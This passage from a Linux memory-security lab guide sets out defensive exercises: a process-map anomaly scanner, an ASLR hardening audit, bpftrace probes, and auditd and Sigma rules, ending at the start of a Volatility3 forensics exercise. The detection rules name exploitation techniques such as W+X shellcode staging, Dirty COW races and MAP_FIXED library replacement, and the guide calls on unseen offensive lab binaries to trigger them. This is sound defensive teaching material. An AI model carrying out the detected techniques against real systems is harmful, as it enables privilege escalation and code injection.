KNOWN_JIT_PROCS = frozenset({
    "java", "node", "python3", "chrome", "firefox",
    "qemu-system-x86_64", "luajit", "dotnet", "mono",
    "chromium-browse", "chromium", "code", "electron",
})

KNOWN_ANON_EXEC = frozenset({"[vdso]", "[vsyscall]"})

EXPECTED_STACK_RANGE_X86_64 = (0x7f0000000000, 0x7fffffffffff)
EXPECTED_MMAP_RANGE_X86_64 = (0x7f0000000000, 0x7fffffffffff)


class Finding:
    def __init__(self, severity, finding_type, detail, mitre_id=None):
        self.severity = severity
        self.finding_type = finding_type
        self.detail = detail
        self.mitre_id = mitre_id or ""
        self.timestamp = datetime.now(timezone.utc).isoformat()

    def __str__(self):
        mitre = f" [{self.mitre_id}]" if self.mitre_id else ""
        return f"[{self.severity}]{mitre} {self.finding_type}: {self.detail}"

    def to_dict(self):
        return {
            "severity": self.severity,
            "type": self.finding_type,
            "detail": self.detail,
            "mitre_id": self.mitre_id,
            "timestamp": self.timestamp,
        }


def parse_maps(pid):
    path = f"/proc/{pid}/maps"
    vmas = []
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 5)
                if len(parts) < 5:
                    continue
                addr_range = parts[0]
                perms = parts[1]
                offset = parts[2]
                dev = parts[3]
                inode = int(parts[4])
                name = parts[5].strip() if len(parts) > 5 else ""
                start, end = (int(x, 16) for x in addr_range.split("-"))
                vmas.append({
                    "start": start,
                    "end": end,
                    "size": end - start,
                    "perms": perms,
                    "offset": offset,
                    "dev": dev,
                    "inode": inode,
                    "name": name,
                    "raw": line,
                })
    except (PermissionError, FileNotFoundError, ProcessLookupError):
        return None
    return vmas


def get_comm(pid):
    try:
        return open(f"/proc/{pid}/comm").read().strip()
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        return "?"


def get_uid(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("Uid:"):
                    return int(line.split()[1])
    except (FileNotFoundError, PermissionError, ProcessLookupError):
        pass
    return -1


def scan_process(pid):
    vmas = parse_maps(pid)
    if vmas is None:
        return None, []

    comm = get_comm(pid)
    uid = get_uid(pid)
    is_jit = comm in KNOWN_JIT_PROCS
    findings = []

    anon_rw_sizes = Counter()
    anon_exec_count = 0
    total_wx = 0
    lib_mappings = defaultdict(list)

    for i, vma in enumerate(vmas):
        perms = vma["perms"]
        name = vma["name"]
        size = vma["size"]
        is_anon = (vma["inode"] == 0 and not name)

        # 1. W+X mapping — CRITICAL
        if "w" in perms and "x" in perms:
            total_wx += 1
            sev = "CRITICAL" if is_anon and size > 0x10000 else "HIGH"
            findings.append(Finding(
                sev, "WX_MAPPING",
                f"W+X mapping ({size:#x} bytes): {vma['raw']}",
                "T1055"
            ))

        # 2. Anonymous executable region (not vDSO/vsyscall)
        if "x" in perms and is_anon and name not in KNOWN_ANON_EXEC:
            anon_exec_count += 1
            if not is_jit:
                findings.append(Finding(
                    "HIGH", "ANON_EXEC",
                    f"Anonymous executable ({size:#x} bytes) at "
                    f"{vma['start']:#x}",
                    "T1055.012"
                ))

        # 3. Track library mappings for gap detection
        if name and "/" in name:
            lib_mappings[name].append(vma)

        # 4. Anonymous RW size tracking (heap spray detection)
        if "r" in perms and "w" in perms and is_anon:
            anon_rw_sizes[size] += 1

        # 5. Stack anomaly
        if name == "[stack]":
            if not (EXPECTED_STACK_RANGE_X86_64[0] <= vma["start"]
                    <= EXPECTED_STACK_RANGE_X86_64[1]):
                findings.append(Finding(
                    "HIGH", "STACK_ANOMALY",
                    f"Stack at unexpected address: {vma['start']:#x}",
                    "T1055"
                ))

        # 6. Large anonymous RWX (shellcode staging area)
        if ("r" in perms and "w" in perms and "x" in perms
                and is_anon and size > 0x10000):
            findings.append(Finding(
                "CRITICAL", "LARGE_RWX_ANON",
                f"Large anonymous RWX ({size / 1024:.0f} KB) at "
                f"{vma['start']:#x}",
                "T1059"
            ))

    # 7. Library gap detection (MAP_FIXED replacement indicator)
    for lib_name, lib_vmas in lib_mappings.items():
        lib_vmas_sorted = sorted(lib_vmas, key=lambda v: v["start"])
        for j in range(1, len(lib_vmas_sorted)):
            prev = lib_vmas_sorted[j - 1]
            curr = lib_vmas_sorted[j]
            gap = curr["start"] - prev["end"]
            if gap > 0x1000:
                findings.append(Finding(
                    "MEDIUM", "LIBRARY_GAP",
                    f"Gap ({gap:#x} bytes) in {os.path.basename(lib_name)} "
                    f"at {prev['end']:#x}—{curr['start']:#x}",
                    "T1574.006"
                ))

    # 8. Heap spray detection
    for sz, count in anon_rw_sizes.items():
        if count > 50 and sz <= 0x10000:
            findings.append(Finding(
                "MEDIUM", "HEAP_SPRAY",
                f"{count} anonymous RW regions of size {sz:#x} "
                f"({sz / 1024:.0f} KB each)",
                "T1055"
            ))

    # 9. Excessive anonymous executable regions (non-JIT)
    if anon_exec_count > 5 and not is_jit:
        findings.append(Finding(
            "HIGH", "EXCESSIVE_ANON_EXEC",
            f"{anon_exec_count} anonymous executable regions in non-JIT "
            f"process '{comm}'",
            "T1059"
        ))

    # 10. VMA count check (DoS / spray indicator)
    max_map = 65530
    try:
        max_map = int(open("/proc/sys/vm/max_map_count").read().strip())
    except (FileNotFoundError, PermissionError):
        pass
    if len(vmas) > max_map * 0.8:
        findings.append(Finding(
            "MEDIUM", "HIGH_VMA_COUNT",
            f"{len(vmas)} VMAs ({len(vmas)/max_map*100:.0f}% of max_map_count "
            f"= {max_map})",
            "T1499"
        ))

    return {
        "pid": pid,
        "comm": comm,
        "uid": uid,
        "vma_count": len(vmas),
        "wx_count": total_wx,
        "anon_exec_count": anon_exec_count,
    }, findings


def scan_all():
    results = []
    for entry in os.listdir("/proc"):
        if not entry.isdigit():
            continue
        info, findings = scan_process(entry)
        if findings:
            results.append((info, findings))
    return results


def watch_mode(pid, interval=5):
    prev_findings = set()
    print(f"[*] Watching PID {pid} every {interval}s (Ctrl+C to stop)")
    while True:
        info, findings = scan_process(pid)
        if info is None:
            print(f"[!] Process {pid} no longer exists")
            break
        current = {(f.finding_type, f.detail) for f in findings}
        new = current - prev_findings
        if new:
            ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
            for finding in findings:
                if (finding.finding_type, finding.detail) in new:
                    print(f"[{ts}] PID {pid} ({info['comm']}): {finding}")
        prev_findings = current
        time.sleep(interval)


def main():
    parser = argparse.ArgumentParser(description="VMA Anomaly Detection Engine")
    parser.add_argument("target", nargs="?", help="PID or --all")
    parser.add_argument("--all", action="store_true", help="Scan all processes")
    parser.add_argument("--watch", type=str, help="Watch a PID continuously")
    parser.add_argument("--json", action="store_true", help="JSON output")
    parser.add_argument("--interval", type=int, default=5,
                        help="Watch interval (seconds)")
    args = parser.parse_args()

    if args.watch:
        watch_mode(args.watch, args.interval)
        return

    if args.all or args.target == "--all":
        results = scan_all()
    elif args.target:
        info, findings = scan_process(args.target)
        results = [(info, findings)] if findings else []
    else:
        parser.print_help()
        return

    if args.json:
        output = []
        for info, findings in results:
            output.append({
                "process": info,
                "findings": [f.to_dict() for f in findings],
            })
        print(json.dumps(output, indent=2))
    else:
        for info, findings in results:
            print(f"\n{'='*60}")
            print(f"PID {info['pid']} ({info['comm']}) "
                  f"uid={info['uid']} VMAs={info['vma_count']}")
            print(f"{'='*60}")
            for f in sorted(findings,
                            key=lambda x: {"CRITICAL": 0, "HIGH": 1,
                                           "MEDIUM": 2, "LOW": 3}.get(
                                               x.severity, 4)):
                print(f"  {f}")

    if not results:
        print("[*] No anomalies detected.")


if __name__ == "__main__":
    main()
```

```bash
cd ~/lab_domain2a/defense

# Scan own process
python3 vma_sentinel.py self

# Scan all processes
sudo python3 vma_sentinel.py --all

# Watch the MAP_FIXED attack process
python3 vma_sentinel.py --watch $(pidof mapfixed_attack)

# JSON output for SIEM
sudo python3 vma_sentinel.py --all --json > /tmp/vma_scan.json
```

**Verification:**
- [ ] Detects W+X mappings correctly
- [ ] Flags anonymous executable regions in non-JIT processes
- [ ] Identifies library gaps from MAP_FIXED replacement
- [ ] Detects heap spray patterns (many same-size anonymous regions)
- [ ] JSON output is valid and parseable by SIEM tools
- [ ] Watch mode detects new anomalies as they appear

---

### Exercise 2: ASLR Hardening Audit and Verification Suite

**Objective:** Build an automated auditing tool that verifies all ASLR-related kernel settings, measures effective entropy, and generates a hardening report.

```python
#!/usr/bin/env python3
"""aslr_audit.py — comprehensive ASLR and memory hardening audit.

Checks:
  - kernel.randomize_va_space
  - vm.mmap_rnd_bits / vm.mmap_rnd_compat_bits
  - kernel.kptr_restrict
  - kernel.dmesg_restrict
  - kernel.perf_event_paranoid
  - vm.unprivileged_userfaultfd
  - kernel.yama.ptrace_scope
  - vm.mmap_min_addr
  - vm.max_map_count
  - CONFIG_PAGE_TABLE_ISOLATION (KPTI)
  - CONFIG_STRICT_DEVMEM
  - CONFIG_VMAP_STACK
  - vsyscall mode
  - PIE compilation of critical binaries
  - Stack clash protection in compiler defaults
"""
import os
import sys
import subprocess
import json
from datetime import datetime, timezone

CHECKS = []


def check(name, description, severity="HIGH"):
    def decorator(func):
        CHECKS.append((name, description, severity, func))
        return func
    return decorator


def sysctl_read(param):
    try:
        with open(f"/proc/sys/{param.replace('.', '/')}") as f:
            return f.read().strip()
    except (FileNotFoundError, PermissionError):
        return None


def kernel_config(option):
    try:
        uname = os.popen("uname -r").read().strip()
        config_path = f"/boot/config-{uname}"
        with open(config_path) as f:
            for line in f:
                if line.startswith(f"{option}="):
                    return line.strip().split("=")[1]
                if line.strip() == f"# {option} is not set":
                    return "n"
    except FileNotFoundError:
        pass
    try:
        result = subprocess.run(
            ["zcat", f"/proc/config.gz"],
            capture_output=True, text=True, timeout=5
        )
        for line in result.stdout.splitlines():
            if line.startswith(f"{option}="):
                return line.strip().split("=")[1]
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass
    return None


@check("ASLR Mode", "kernel.randomize_va_space should be 2 (full)", "CRITICAL")
def check_aslr_mode():
    val = sysctl_read("kernel.randomize_va_space")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    if val == "2":
        return "PASS", f"Full ASLR enabled (value={val})"
    if val == "1":
        return "WARN", f"Partial ASLR (value={val}) — brk not randomized"
    return "FAIL", f"ASLR disabled (value={val})"


@check("mmap Entropy", "vm.mmap_rnd_bits should be >= 28 (ideally 32)")
def check_mmap_rnd():
    val = sysctl_read("vm.mmap_rnd_bits")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    bits = int(val)
    if bits >= 32:
        return "PASS", f"Maximum entropy ({bits} bits)"
    if bits >= 28:
        return "WARN", f"Default entropy ({bits} bits) — consider increasing to 32"
    return "FAIL", f"Low entropy ({bits} bits)"


@check("Compat mmap Entropy", "vm.mmap_rnd_compat_bits for 32-bit processes")
def check_mmap_rnd_compat():
    val = sysctl_read("vm.mmap_rnd_compat_bits")
    if val is None:
        return "PASS", "No 32-bit compat support (not applicable)"
    bits = int(val)
    if bits >= 16:
        return "PASS", f"Maximum compat entropy ({bits} bits)"
    if bits >= 8:
        return "WARN", f"Default compat entropy ({bits} bits)"
    return "FAIL", f"Low compat entropy ({bits} bits)"


@check("Kernel Pointer Restriction", "kernel.kptr_restrict should be 2", "CRITICAL")
def check_kptr():
    val = sysctl_read("kernel.kptr_restrict")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    if val == "2":
        return "PASS", "Kernel pointers hidden from all users"
    if val == "1":
        return "WARN", f"Kernel pointers hidden from non-CAP_SYSLOG (value={val})"
    return "FAIL", f"Kernel pointers exposed (value={val})"


@check("dmesg Restriction", "kernel.dmesg_restrict should be 1")
def check_dmesg():
    val = sysctl_read("kernel.dmesg_restrict")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    if val == "1":
        return "PASS", "dmesg restricted to CAP_SYSLOG"
    return "FAIL", f"dmesg unrestricted (value={val}) — pointer leaks possible"


@check("perf_event Paranoid", "kernel.perf_event_paranoid should be >= 2")
def check_perf():
    val = sysctl_read("kernel.perf_event_paranoid")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    level = int(val)
    if level >= 3:
        return "PASS", f"perf disabled for unprivileged users (level={level})"
    if level >= 2:
        return "WARN", f"perf partially restricted (level={level})"
    return "FAIL", f"perf accessible to users (level={level}) — address leaks"


@check("userfaultfd Restriction", "vm.unprivileged_userfaultfd should be 0")
def check_userfaultfd():
    val = sysctl_read("vm.unprivileged_userfaultfd")
    if val is None:
        return "PASS", "sysctl not present (likely restricted)"
    if val == "0":
        return "PASS", "Unprivileged userfaultfd disabled"
    return "FAIL", f"Unprivileged userfaultfd enabled (value={val}) — race primitive"


@check("Yama ptrace Scope", "kernel.yama.ptrace_scope should be >= 2")
def check_yama():
    val = sysctl_read("kernel.yama.ptrace_scope")
    if val is None:
        return "UNKNOWN", "Yama LSM not loaded"
    scope = int(val)
    levels = {0: "classic", 1: "restricted", 2: "admin-only", 3: "no-ptrace"}
    label = levels.get(scope, "unknown")
    if scope >= 2:
        return "PASS", f"ptrace scope={scope} ({label})"
    if scope == 1:
        return "WARN", f"ptrace scope={scope} ({label}) — parent-only"
    return "FAIL", f"ptrace scope={scope} ({label}) — unrestricted"


@check("mmap_min_addr", "vm.mmap_min_addr should be >= 65536")
def check_mmap_min():
    val = sysctl_read("vm.mmap_min_addr")
    if val is None:
        return "UNKNOWN", "Cannot read sysctl"
    addr = int(val)
    if addr >= 65536:
        return "PASS", f"mmap_min_addr={addr} (prevents NULL deref exploits)"
    return "FAIL", f"mmap_min_addr={addr} — NULL page mappable"


@check("KPTI", "CONFIG_PAGE_TABLE_ISOLATION for Meltdown mitigation")
def check_kpti():
    val = kernel_config("CONFIG_PAGE_TABLE_ISOLATION")
    if val == "y":
        return "PASS", "KPTI enabled"
    if val == "n":
        return "WARN", "KPTI disabled — check if CPU is immune to Meltdown"
    return "UNKNOWN", "Cannot determine KPTI status"


@check("Strict /dev/mem", "CONFIG_STRICT_DEVMEM")
def check_strict_devmem():
    val = kernel_config("CONFIG_STRICT_DEVMEM")
    if val == "y":
        return "PASS", "/dev/mem restricted to I/O regions"
    return "FAIL", "/dev/mem allows arbitrary physical memory access"


@check("VMAP Stack", "CONFIG_VMAP_STACK for kernel stack guard pages")
def check_vmap_stack():
    val = kernel_config("CONFIG_VMAP_STACK")
    if val == "y":
        return "PASS", "Kernel stacks have guard pages via vmalloc"
    return "FAIL", "No kernel stack guard pages"


@check("vsyscall Mode", "vsyscall should be 'none' or 'emulate'")
def check_vsyscall():
    try:
        with open("/proc/self/maps") as f:
            for line in f:
                if "[vsyscall]" in line:
                    if "--xp" in line:
                        return "WARN", "vsyscall mapped execute-only (xonly mode)"
                    return "WARN", f"vsyscall mapped: {line.strip()}"
        return "PASS", "No vsyscall mapping (none mode)"
    except (FileNotFoundError, PermissionError):
        return "UNKNOWN", "Cannot check vsyscall"


@check("Critical Binaries PIE", "sshd, sudo, su should be PIE")
def check_pie_binaries():
    binaries = ["/usr/bin/sudo", "/usr/bin/su", "/usr/sbin/sshd",
                "/usr/bin/passwd", "/usr/bin/login"]
    non_pie = []
    for b in binaries:
        if not os.path.exists(b):
            continue
        try:
            result = subprocess.run(
                ["file", b], capture_output=True, text=True, timeout=5
            )
            if "pie executable" not in result.stdout.lower():
                non_pie.append(os.path.basename(b))
        except subprocess.TimeoutExpired:
            pass
    if not non_pie:
        return "PASS", "All checked binaries are PIE"
    return "WARN", f"Non-PIE binaries: {', '.join(non_pie)}"


def run_audit():
    results = []
    pass_count = fail_count = warn_count = unknown_count = 0

    print("=" * 70)
    print("  ASLR & Memory Hardening Audit Report")
    print(f"  Date: {datetime.now(timezone.utc).isoformat()}")
    print(f"  Kernel: {os.popen('uname -r').read().strip()}")
    print("=" * 70)

    for name, desc, severity, func in CHECKS:
        status, detail = func()
        results.append({
            "check": name,
            "description": desc,
            "severity": severity,
            "status": status,
            "detail": detail,
        })

        icon = {"PASS": "+", "FAIL": "!", "WARN": "~", "UNKNOWN": "?"}.get(
            status, " ")
        color = {
            "PASS": "\033[92m", "FAIL": "\033[91m",
            "WARN": "\033[93m", "UNKNOWN": "\033[90m"
        }.get(status, "")
        reset = "\033[0m"

        print(f"\n  {color}[{icon}] {name}{reset}")
        print(f"      {detail}")

        if status == "PASS": pass_count += 1
        elif status == "FAIL": fail_count += 1
        elif status == "WARN": warn_count += 1
        else: unknown_count += 1

    total = len(CHECKS)
    score = (pass_count / total) * 100 if total > 0 else 0

    print("\n" + "=" * 70)
    print(f"  Score: {score:.0f}% ({pass_count}/{total} passed)")
    print(f"  PASS={pass_count} WARN={warn_count} "
          f"FAIL={fail_count} UNKNOWN={unknown_count}")
    print("=" * 70)

    if fail_count > 0:
        print("\n  Recommended hardening commands:")
        for r in results:
            if r["status"] == "FAIL":
                print(f"    # Fix: {r['check']}")

        print("""
    sudo sysctl -w kernel.randomize_va_space=2
    sudo sysctl -w vm.mmap_rnd_bits=32
    sudo sysctl -w kernel.kptr_restrict=2
    sudo sysctl -w kernel.dmesg_restrict=1
    sudo sysctl -w kernel.perf_event_paranoid=3
    sudo sysctl -w vm.unprivileged_userfaultfd=0
    sudo sysctl -w kernel.yama.ptrace_scope=2

    # Persist in /etc/sysctl.d/99-hardening.conf
        """)

    return results


if __name__ == "__main__":
    if "--json" in sys.argv:
        results = []
        for name, desc, severity, func in CHECKS:
            status, detail = func()
            results.append({
                "check": name, "status": status,
                "detail": detail, "severity": severity,
            })
        print(json.dumps(results, indent=2))
    else:
        run_audit()
```

```bash
cd ~/lab_domain2a/defense

# Run the audit
python3 aslr_audit.py

# JSON output for automation
python3 aslr_audit.py --json > /tmp/aslr_audit.json
```

**Verification:**
- [ ] All sysctl values are read and compared against hardened baselines
- [ ] Kernel config options (KPTI, STRICT_DEVMEM, VMAP_STACK) are checked
- [ ] PIE compilation of critical binaries is verified
- [ ] vsyscall mode is detected
- [ ] Score and remediation commands are generated

---

### Exercise 3: Memory Operation Monitoring with bpftrace

**Objective:** Deploy real-time eBPF-based monitoring for suspicious memory operations: W+X mmap, mprotect adding exec, userfaultfd, high-frequency madvise(MADV_DONTNEED), MAP_FIXED abuse, and cross-process memory access.

```bash
#!/bin/bash
# memory_monitor.sh — deploy bpftrace probes for memory attack detection
# Requires: root, bpftrace installed

set -euo pipefail

if [ "$EUID" -ne 0 ]; then
    echo "Run as root: sudo $0"
    exit 1
fi

PROBE_DIR="$HOME/lab_domain2a/defense/probes"
mkdir -p "$PROBE_DIR"

# --- Probe 1: W+X mmap detection ---
cat > "$PROBE_DIR/wx_mmap.bt" << 'PROBE'
/*
 * Detect mmap calls requesting both WRITE and EXEC permissions.
 * PROT_WRITE=0x2, PROT_EXEC=0x4 => W+X = 0x6 or higher with both set.
 */
tracepoint:syscalls:sys_enter_mmap
/args->prot & 0x2 && args->prot & 0x4/
{
    printf("[%s] W+X mmap: pid=%d comm=%s prot=0x%x addr=0x%lx len=0x%lx\n",
        strftime("%H:%M:%S", nsecs),
        pid, comm, args->prot, args->addr, args->len);
}
PROBE

# --- Probe 2: mprotect adding PROT_EXEC ---
cat > "$PROBE_DIR/mprotect_exec.bt" << 'PROBE'
/*
 * Detect mprotect adding execute permission.
 * Classic shellcode activation: alloc RW → write shellcode → mprotect RX
 */
tracepoint:syscalls:sys_enter_mprotect
/args->prot & 0x4/
{
    printf("[%s] mprotect +EXEC: pid=%d comm=%s addr=0x%lx len=0x%lx prot=0x%x\n",
        strftime("%H:%M:%S", nsecs),
        pid, comm, args->addr, args->len, args->prot);
}
PROBE

# --- Probe 3: MADV_DONTNEED frequency (Dirty COW indicator) ---
cat > "$PROBE_DIR/madvise_dontneed.bt" << 'PROBE'
/*
 * Track madvise(MADV_DONTNEED) call frequency per process.
 * High frequency from non-allocator processes is anomalous.
 * MADV_DONTNEED = 4
 */
tracepoint:syscalls:sys_enter_madvise
/args->advice == 4/
{
    @dontneed[pid, comm] = count();
}

interval:s:10
{
    printf("\n[%s] MADV_DONTNEED counts (last 10s):\n",
        strftime("%H:%M:%S", nsecs));
    print(@dontneed);
    clear(@dontneed);
}
PROBE

# --- Probe 4: userfaultfd from non-root ---
cat > "$PROBE_DIR/userfaultfd.bt" << 'PROBE'
/*
 * Detect userfaultfd syscall — exploitation primitive for race conditions.
 */
tracepoint:syscalls:sys_enter_userfaultfd
{
    printf("[%s] userfaultfd: pid=%d uid=%d comm=%s flags=0x%x\n",
        strftime("%H:%M:%S", nsecs),
        pid, uid, comm, args->flags);
}
PROBE

# --- Probe 5: MAP_FIXED mmap ---
cat > "$PROBE_DIR/map_fixed.bt" << 'PROBE'
/*
 * Detect mmap with MAP_FIXED flag (0x10).
 * MAP_FIXED silently replaces existing mappings — library replacement attack.
 */
tracepoint:syscalls:sys_enter_mmap
/args->flags & 0x10/
{
    printf("[%s] MAP_FIXED: pid=%d comm=%s addr=0x%lx len=0x%lx "
           "prot=0x%x flags=0x%x\n",
        strftime("%H:%M:%S", nsecs),
        pid, comm, args->addr, args->len, args->prot, args->flags);
}
PROBE

# --- Probe 6: Cross-process memory access ---
cat > "$PROBE_DIR/cross_process_mem.bt" << 'PROBE'
/*
 * Detect process_vm_readv and process_vm_writev — cross-process memory access.
 */
tracepoint:syscalls:sys_enter_process_vm_readv,
tracepoint:syscalls:sys_enter_process_vm_writev
{
    printf("[%s] %s: pid=%d comm=%s target_pid=%d\n",
        strftime("%H:%M:%S", nsecs),
        probe, pid, comm, args->pid);
}
PROBE

# --- Unified launcher ---
cat > "$PROBE_DIR/run_all_probes.sh" << 'RUNNER'
#!/bin/bash
# Run all memory probes in parallel using tmux
PROBE_DIR="$(dirname "$0")"

if ! command -v tmux &>/dev/null; then
    echo "tmux required. Install: apt install tmux"
    exit 1
fi

SESSION="mem_monitor"
tmux kill-session -t "$SESSION" 2>/dev/null || true
tmux new-session -d -s "$SESSION" -n "wx_mmap"

tmux send-keys -t "$SESSION:wx_mmap" \
    "bpftrace $PROBE_DIR/wx_mmap.bt" C-m
tmux new-window -t "$SESSION" -n "mprotect"
tmux send-keys -t "$SESSION:mprotect" \
    "bpftrace $PROBE_DIR/mprotect_exec.bt" C-m
tmux new-window -t "$SESSION" -n "madvise"
tmux send-keys -t "$SESSION:madvise" \
    "bpftrace $PROBE_DIR/madvise_dontneed.bt" C-m
tmux new-window -t "$SESSION" -n "uffd"
tmux send-keys -t "$SESSION:uffd" \
    "bpftrace $PROBE_DIR/userfaultfd.bt" C-m
tmux new-window -t "$SESSION" -n "mapfixed"
tmux send-keys -t "$SESSION:mapfixed" \
    "bpftrace $PROBE_DIR/map_fixed.bt" C-m
tmux new-window -t "$SESSION" -n "crossmem"
tmux send-keys -t "$SESSION:crossmem" \
    "bpftrace $PROBE_DIR/cross_process_mem.bt" C-m

echo "[*] Memory monitor running in tmux session: $SESSION"
echo "[*] Attach: tmux attach -t $SESSION"
echo "[*] Kill:   tmux kill-session -t $SESSION"
RUNNER
chmod +x "$PROBE_DIR/run_all_probes.sh"

echo "[*] Probes written to $PROBE_DIR/"
echo "[*] Run all probes: sudo $PROBE_DIR/run_all_probes.sh"
echo "[*] Or run individual: sudo bpftrace $PROBE_DIR/<probe>.bt"
echo ""
echo "[*] Test with the offensive exercises from Part A:"
echo "    - W+X mmap:     Exercise 7 (MAP_FIXED attack)"
echo "    - MADV_DONTNEED: Exercise 5 (Dirty COW analyzer)"
echo "    - mprotect:      Any shellcode exercise"
```

```bash
# Deploy the probes
sudo bash memory_monitor.sh

# In another terminal, run the probes
sudo ~/lab_domain2a/defense/probes/run_all_probes.sh

# In yet another terminal, run offensive exercises to trigger detections
./mapfixed_attack   # triggers MAP_FIXED + W+X mmap probes
./dirtycow_analyzer # triggers MADV_DONTNEED probe
```

**Verification:**
- [ ] W+X mmap probe fires when Exercise 7 (MAP_FIXED) runs
- [ ] madvise probe shows MADV_DONTNEED counts during Exercise 5
- [ ] All 6 probes run simultaneously via tmux
- [ ] Output includes timestamps, PIDs, and relevant syscall arguments

---

### Exercise 4: auditd + Sigma Detection Rules Deployment

**Objective:** Deploy a comprehensive set of auditd rules for memory-manipulation detection, write corresponding Sigma rules, and verify they detect the attack exercises from Part A.

```bash
#!/bin/bash
# deploy_audit_rules.sh — install memory-manipulation detection rules

set -euo pipefail

RULES_FILE="/etc/audit/rules.d/50-memory-manipulation.rules"

sudo tee "$RULES_FILE" > /dev/null << 'RULES'
## Memory Manipulation Detection Rules
## Reference: Domain 2A Process Memory Security

## W+X mmap (PROT_WRITE|PROT_EXEC = 0x6)
-a always,exit -F arch=b64 -S mmap -F a2&=0x6 -k memory_wx_mmap

## mprotect adding PROT_EXEC (bit 0x4)
-a always,exit -F arch=b64 -S mprotect -F a2&=0x4 -k memory_mprotect_exec

## MAP_FIXED mmap (flag bit 0x10)
-a always,exit -F arch=b64 -S mmap -F a3&=0x10 -k memory_map_fixed

## userfaultfd (race-condition primitive)
-a always,exit -F arch=b64 -S userfaultfd -k memory_userfaultfd

## cross-process memory access
-a always,exit -F arch=b64 -S process_vm_readv -k memory_cross_read
-a always,exit -F arch=b64 -S process_vm_writev -k memory_cross_write

## ptrace POKETEXT/POKEDATA (code injection)
-a always,exit -F arch=b64 -S ptrace -F a0=4 -k memory_ptrace_poke
-a always,exit -F arch=b64 -S ptrace -F a0=5 -k memory_ptrace_poke

## madvise MADV_DONTNEED (Dirty COW indicator)
-a always,exit -F arch=b64 -S madvise -F a2=4 -k memory_madvise_dontneed

## /proc/pid/pagemap access (ret2dir physical address leak)
-w /proc/ -p r -k memory_proc_access

## nfnetlink socket (nf_tables exploit prerequisite)
-a always,exit -F arch=b64 -S socket -F a0=16 -F a2=12 -k memory_nfnetlink
RULES

echo "[*] Rules written to $RULES_FILE"

# Reload audit rules
sudo augenrules --load
echo "[*] Audit rules loaded."

# Verify
sudo auditctl -l | grep memory_
echo "[*] Active memory rules listed above."
```

Write the corresponding Sigma rules:

```yaml
# sigma_memory_wx_mmap.yml
title: W+X Anonymous Memory Mapping via mmap
id: a1b2c3d4-0001-4a5b-8c9d-memory001
status: stable
description: >
    Detects mmap creating memory with both write and execute
    permissions — a prerequisite for shellcode injection.
author: Lab Domain 2A
date: 2025/05/18
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mmap
        key: memory_wx_mmap
    filter_known:
        exe|endswith:
            - '/java'
            - '/node'
            - '/python3'
            - '/qemu-system-x86_64'
    condition: selection and not filter_known
level: high
tags:
    - attack.defense_evasion
    - attack.t1055
falsepositives:
    - JIT compilers
    - Dynamic code generation frameworks

---
# sigma_memory_mprotect_exec.yml
title: mprotect Adding Execute Permission
id: a1b2c3d4-0002-4a5b-8c9d-memory002
status: stable
description: >
    Detects mprotect changing memory protection to include PROT_EXEC.
    Classic shellcode activation sequence: alloc RW, write code, mprotect RX.
author: Lab Domain 2A
date: 2025/05/18
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: mprotect
        key: memory_mprotect_exec
    filter_known:
        exe|endswith:
            - '/java'
            - '/node'
            - '/dotnet'
    condition: selection and not filter_known
level: high
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1055

---
# sigma_memory_userfaultfd.yml
title: Unprivileged userfaultfd Registration
id: a1b2c3d4-0003-4a5b-8c9d-memory003
status: stable
description: >
    Detects userfaultfd syscall. userfaultfd is a key race-condition
    exploitation primitive that pauses kernel page fault handling.
author: Lab Domain 2A
date: 2025/05/18
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: userfaultfd
        key: memory_userfaultfd
    filter_root:
        uid: '0'
    condition: selection and not filter_root
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068

---
# sigma_memory_dontneed_burst.yml
title: High Frequency MADV_DONTNEED (Dirty COW Indicator)
id: a1b2c3d4-0004-4a5b-8c9d-memory004
status: stable
description: >
    Detects bursts of madvise(MADV_DONTNEED) calls which indicate
    Dirty COW race attempts or heap manipulation.
author: Lab Domain 2A
date: 2025/05/18
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: madvise
        key: memory_madvise_dontneed
    condition: selection | count() by exe > 100
    timeframe: 60s
level: high
tags:
    - attack.privilege_escalation
    - attack.t1068
    - cve.2016.5195
```

```bash
# Deploy rules
sudo bash deploy_audit_rules.sh

# Save Sigma rules
mkdir -p ~/lab_domain2a/defense/sigma/
# (save each YAML block above to its own file)

# Test detection
./dirtycow_analyzer  # should trigger memory_madvise_dontneed
./mapfixed_attack     # should trigger memory_wx_mmap + memory_map_fixed

# Check audit log
sudo ausearch -k memory_wx_mmap -ts recent
sudo ausearch -k memory_madvise_dontneed -ts recent
sudo ausearch -k memory_map_fixed -ts recent
```

**Verification:**
- [ ] auditd rules load without errors
- [ ] `ausearch -k memory_wx_mmap` returns events after running MAP_FIXED exercise
- [ ] `ausearch -k memory_madvise_dontneed` returns events after Dirty COW exercise
- [ ] Sigma rules parse correctly with `sigma check`

---

### Exercise 5: Memory Forensics with Volatility3

**Objective:** Acquire a memory dump, analyze it with Volatility3, detect exploitation artifacts (W+X regions, hidden processes, syscall hooks), reconstruct process memory maps, and build a forensic timeline.

#### Step 1: Build and load LiME

```bash
cd ~/tools/LiME/src
make
echo "[*] LiME module built: lime-$(uname -r).ko"

# Acquire memory dump
sudo insmod lime-$(uname -r).ko \
    "path=$HOME/lab_domain2a/dumps/memory.lime format=lime"
echo "[*] Memory dump saved to ~/lab_domain2a/dumps/memory.lime"

# Verify
ls -lh ~/lab_domain2a/dumps/memory.lime
sha256sum ~/lab_domain2a/dumps/memory.lime \
    > ~/lab_domain2a/dumps/memory.lime.sha256
```

#### Step 2: Generate Volatility3 symbol table

```bash
# If kernel debug symbols are installed
